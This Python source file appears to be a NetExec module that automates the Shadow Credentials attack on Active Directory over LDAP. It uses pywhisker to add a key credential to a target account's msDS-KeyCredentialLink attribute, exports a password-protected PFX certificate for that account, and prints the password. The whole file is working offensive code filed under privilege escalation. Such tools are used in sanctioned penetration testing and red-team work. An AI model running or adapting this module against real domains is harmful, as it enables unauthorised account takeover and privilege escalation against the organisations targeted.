from nxc.helpers.misc import CATEGORY
from nxc.paths import TMP_PATH
from datetime import datetime
from pathlib import Path
from types import SimpleNamespace
from pywhisker.pywhisker import ShadowCredentials, init_ldap_session
import secrets
import string


class _PywLoggerAdapter:
    """Forward pywhisker logs to NetExec's logger, and flag specific conditions."""
    def __init__(self, context, verbosity=2, quiet=False):
        self.context = context
        self.verbosity = verbosity
        self.quiet = quiet
        self.perm_denied = False
        self.not_found = False

        self._denied_patterns = (
            "insuff_access_rights",
            "00002098"
        )
        self._notfound_patterns = (
            "user not found"
        )

    def info(self, msg):    self.context.log.info(msg)
    def success(self, msg): self.context.log.success(msg)

    def error(self, msg):
        txt = str(msg)
        low = txt.lower()

        if any(p in low for p in self._notfound_patterns):
            self.not_found = True
            # downrank to verbose to avoid double-print
            if self.verbosity >= 2:
                self.context.log.debug(txt)
            return

        if any(p in low for p in self._denied_patterns):
            self.perm_denied = True
            if self.verbosity >= 2:
                self.context.log.debug(txt)
            return

        # default: show as error
        self.context.log.error(txt)

    def debug(self, msg):
        if self.verbosity >= 1:
            self.context.log.debug(msg)

    def verbose(self, msg):
        if self.verbosity >= 2:
            self.context.log.debug(msg)

    def warning(self, msg):
        self.context.log.highlight(msg)


class NXCModule:
    """
    Module by @qu35t_tv
    """
    name = "shadow-creds"
    description = "Exploits the Shadow Credentials attack to extract the authentication certificate from the target"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self):
        self.domain = None
        self.dc_ip = None
        self.username = None
        self.password = None
        self.nthash = None

        self.target = None
        self.pfx_pass = None
        self.out_dir = None
        self.paths = {}

    def options(self, context, module_options):
        """
        Options:
          TARGET=<sAMAccountName|user@domain>   (required)
          PFXPASS=<password>                    (optional; default: random strong password)
          OUTDIR=<path>                         (optional)
        """
        self.target = module_options.get("TARGET") or module_options.get("target")
        if not self.target:
            context.log.fail("TARGET is required (e.g., TARGET=svc_backup or TARGET=pc01$)")
            exit(1)
        self.pfx_pass = module_options.get("PFXPASS") or module_options.get("pfxpass") or None

        ts = datetime.now().strftime("%Y%m%d-%H%M%S")
        suggested = Path(TMP_PATH) / f"shadow-creds-{self.target}-{ts}"
        self.out_dir = Path(module_options.get("OUTDIR") or module_options.get("outdir") or suggested).resolve()
        return {"TARGET": self.target, "PFXPASS": "<auto>" if not self.pfx_pass else "<provided>", "OUTDIR": str(self.out_dir)}

    # ---------------- helpers ----------------
    def _ensure_outdir(self):
        self.out_dir.mkdir(parents=True, exist_ok=True)

    def _gather_conn_info(self, connection):
        self.domain = getattr(connection, "domain", None)
        self.dc_ip = getattr(connection, "dc_ip", None) or getattr(connection, "host", None)
        self.username = getattr(connection, "username", None)
        self.password = getattr(connection, "password", None)
        self.nthash = getattr(connection, "nthash", None)
        if not self.domain:
            self.context.log.fail("Missing 'domain' on connection")
            exit(1)

    def _get_ldap_handles(self, context, connection):
        args = SimpleNamespace(
            dc_ip=self.dc_ip,
            dc_host=None,
            use_ldaps=False,
            use_schannel=False,
            use_kerberos=False,
            auth_hashes=None,
            auth_key=None,
            crt=None,
            key=None,
        )

        password = self.password or ""
        lmhash = ""
        nthash = (self.nthash or "").lower()

        if nthash:
            if ":" in nthash:
                lmhash, _, nt_only = nthash.partition(":")
                lmhash = lmhash or ""
                nthash = nt_only
            args.auth_hashes = f"{lmhash}:{nthash}"
            password = ""

        srv, sess = init_ldap_session(args, self.domain, self.username, password, lmhash, nthash)
        context.log.debug("Created LDAP session via pywhisker.init_ldap_session()")
        return srv, sess

    def _step_shadow_creds(self, context, connection):
        # Create LDAP session
        ldap_server, ldap_session = self._get_ldap_handles(context, connection)
        logger = _PywLoggerAdapter(context, verbosity=0, quiet=False)

        self._ensure_outdir()
        base_path = str(self.out_dir / self.target)
        self.paths["pfx"] = base_path + ".pfx"

        # Generate PFX password
        if not self.pfx_pass:
            alphabet = string.ascii_letters + string.digits
            self.pfx_pass = "".join(secrets.choice(alphabet) for _ in range(24))

        sc = ShadowCredentials(
            ldap_server, ldap_session,
            target_samname=self.target,
            target_domain=self.domain,
            logger=logger
        )

        sc.add(
            password=self.pfx_pass,
            path=base_path,
            export_type="PFX",
            domain=self.domain,
            target_domain=None
        )

        pfx_path = Path(self.paths["pfx"])
        if not pfx_path.exists():
            if logger.perm_denied:
                context.log.fail("No permissions to modify msDS-KeyCredentialLink on the target (INSUFF_ACCESS_RIGHTS).")
                return
            if logger.not_found:
                context.log.fail("TARGET not found in LDAP.")
                return
            raise RuntimeError("PFX not created by pywhisker API")
        context.log.success(f"PFX password: {self.pfx_pass}")

    def on_login(self, context, connection):
        try:
            self._gather_conn_info(connection)
            self._ensure_outdir()
            self.paths["dir"] = str(self.out_dir)
            context.log.success(f"Output directory: {self.out_dir}")
        except Exception as e:
            context.log.error(str(e))
            return

        try:
            self._step_shadow_creds(context, connection)
        except Exception as e:
            context.log.error(f"Shadow Credentials attack failed: {e}")
            return
